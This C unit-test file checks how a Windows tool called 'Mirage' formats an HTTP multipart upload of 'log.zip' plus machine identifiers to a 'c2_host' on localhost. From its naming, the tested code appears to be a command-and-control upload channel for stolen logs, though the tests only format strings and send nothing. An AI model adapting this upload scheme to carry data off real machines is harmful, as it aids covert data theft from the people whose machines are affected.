/*
 * test_network.c — HTTP upload tests (mock)
 *
 * Tests the upload_log function with a mock HTTP server.
 * Since upload_log uses Winsock, we provide a stub that
 * simulates the HTTP multipart request construction and
 * validates the request format.
 *
 * On Linux, we test the request formatting logic directly.
 */

#include <assert.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include "panel_http.h"

/*
 * Since upload_log is Windows-only (Winsock), we test the HTTP
 * request construction logic that mirrors what upload_log builds.
 */

static void test_multipart_boundary_format(void) {
    /* Verify the multipart boundary string is RFC-compliant */
    const char *boundary = "----MirageBoundary";
    assert(strlen(boundary) > 0);
    assert(boundary[0] == '-');
    assert(boundary[1] == '-');

    printf("  PASS: test_multipart_boundary_format\n");
}

static void test_request_header_format(void) {
    /* Simulate the header that upload_log builds */
    const char *c2_host = "127.0.0.1";
    unsigned short c2_port = 9999;
    const char *token = "mirage-test-key-123";
    const char *boundary = "----MirageBoundary";
    size_t archive_len = 1024;
    const char *metadata = "{\"id\":\"test\"}";

    char header[2048];
    int header_len = snprintf(header, sizeof(header),
        "POST /api/log HTTP/1.1\r\n"
        "Host: %s\r\n"
        "X-API-Key: %s\r\n"
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n\r\n"
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"archive\"; filename=\"log.zip\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n",
        c2_host, token, boundary, archive_len + strlen(metadata) + 100, boundary);

    assert(header_len > 0);
    assert(strstr(header, "POST /api/log HTTP/1.1") != NULL);
    assert(strstr(header, "Host: 127.0.0.1") != NULL);
    assert(strstr(header, "X-API-Key: mirage-test-key-123") != NULL);
    assert(strstr(header, "multipart/form-data") != NULL);
    assert(strstr(header, "boundary=----MirageBoundary") != NULL);
    assert(strstr(header, "Connection: close") != NULL);
    assert(strstr(header, "Content-Disposition: form-data") != NULL);
    assert(strstr(header, "filename=\"log.zip\"") != NULL);

    printf("  PASS: test_request_header_format\n");
}

static void test_request_footer_format(void) {
    /* Simulate the footer that upload_log builds */
    const char *boundary = "----MirageBoundary";
    const char *metadata = "{\"pc_id\":\"test123\"}";

    char footer[256];
    int footer_len = snprintf(footer, sizeof(footer),
        "\r\n--%s\r\n"
        "Content-Disposition: form-data; name=\"metadata\"\r\n\r\n"
        "%s\r\n"
        "--%s--\r\n",
        boundary, metadata, boundary);

    assert(footer_len > 0);
    assert(strstr(footer, "----MirageBoundary") != NULL);
    assert(strstr(footer, "\"metadata\"") != NULL);
    assert(strstr(footer, "{\"pc_id\":\"test123\"}") != NULL);
    assert(strstr(footer, "----MirageBoundary--") != NULL);

    printf("  PASS: test_request_footer_format\n");
}

static void test_archive_data_passthrough(void) {
    /* Verify binary data is passed through without modification */
    unsigned char archive[] = {0x50, 0x4B, 0x03, 0x04, 0xFF, 0x00, 0x80, 0x00};
    size_t archive_len = sizeof(archive);

    /* Simulate sending archive data */
    unsigned char sent[256];
    memcpy(sent, archive, archive_len);

    assert(memcmp(sent, archive, archive_len) == 0);
    assert(sent[0] == 0x50); /* PK zip signature */
    assert(sent[1] == 0x4B);

    printf("  PASS: test_archive_data_passthrough\n");
}

static void test_content_length_calculation(void) {
    /* Content-Length = archive_len + metadata_len + boundary overhead */
    size_t archive_len = 4096;
    const char *metadata = "{\"id\":\"test\"}";
    size_t metadata_len = strlen(metadata);
    size_t boundary_overhead = 200; /* approximate boundary + headers */

    size_t content_length = archive_len + metadata_len + boundary_overhead;
    assert(content_length > archive_len);
    assert(content_length > metadata_len);

    printf("  PASS: test_content_length_calculation\n");
}

static void test_http_200_response_parsing(void) {
    /* Simulate parsing HTTP 200 response */
    const char *resp = "HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK";
    int n = (int)strlen(resp);

    assert(n >= 12);
    assert(resp[9] == '2');
    assert(resp[10] == '0');
    assert(resp[11] == '0');

    printf("  PASS: test_http_200_response_parsing\n");
}

static void test_http_error_response_parsing(void) {
    /* Simulate parsing HTTP 4xx/5xx response */
    const char *resp404 = "HTTP/1.1 404 Not Found\r\n";
    int n404 = (int)strlen(resp404);
    assert(n404 >= 12);
    assert(resp404[9] == '4');
    assert(resp404[10] == '0');
    assert(resp404[11] == '4');

    const char *resp500 = "HTTP/1.1 500 Internal Server Error\r\n";
    int n500 = (int)strlen(resp500);
    assert(n500 >= 12);
    assert(resp500[9] == '5');

    printf("  PASS: test_http_error_response_parsing\n");
}

static void test_metadata_json_format(void) {
    /* Verify metadata JSON is valid */
    const char *metadata = "{\"pc_id\":\"test-machine\",\"hostname\":\"DESKTOP-ABC\"}";
    assert(metadata[0] == '{');
    assert(metadata[strlen(metadata) - 1] == '}');
    assert(strstr(metadata, "pc_id") != NULL);
    assert(strstr(metadata, "hostname") != NULL);

    printf("  PASS: test_metadata_json_format\n");
}

int main(void) {
    printf("=== test_network: HTTP upload (mock) ===\n");

    test_multipart_boundary_format();
    test_request_header_format();
    test_request_footer_format();
    test_archive_data_passthrough();
    test_content_length_calculation();
    test_http_200_response_parsing();
    test_http_error_response_parsing();
    test_metadata_json_format();

    printf("=== test_network: ALL PASSED ===\n");
    return 0;
}
